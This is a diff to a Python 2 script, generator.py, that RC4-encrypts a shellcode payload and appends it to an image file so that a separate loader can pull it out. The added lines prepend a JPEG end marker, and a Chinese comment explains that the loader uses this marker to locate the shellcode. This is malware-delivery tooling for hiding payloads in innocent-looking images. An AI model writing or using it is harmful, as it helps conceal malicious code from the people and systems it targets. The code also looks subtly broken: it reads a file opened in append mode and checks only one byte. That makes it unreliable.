@@ -1,6 +1,13 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-
+'''
+Descripttion: 
+Author: yumu
+Email: 2@33.al
+Date: 2021-01-14 13:55:31
+LastEditors: yumu
+LastEditTime: 2021-01-14 16:41:04
+'''
 """
 Author: Gality
 Name：generator.py
@@ -53,6 +60,11 @@ def main():
     payload = rc4(baseStr, key)
 
     f = open(imgName, 'ab+')
+    fileend = f.read()[-2:]
+    if(ord(fileend[0])!=255 and ord(fileend[0])!=217):
+        # 由于加载器中使用 \xff\xd9 进行判断文件结尾，所以不以这两个字符结尾的图片不能正常获取到shellcode的开头。
+        payload = chr(255)+chr(217) + payload
+        print("Abnormal end of file, auto add \xff\xd9")
     f.write(payload)
     f.close()
     print "Payload has been appended to %", imgName
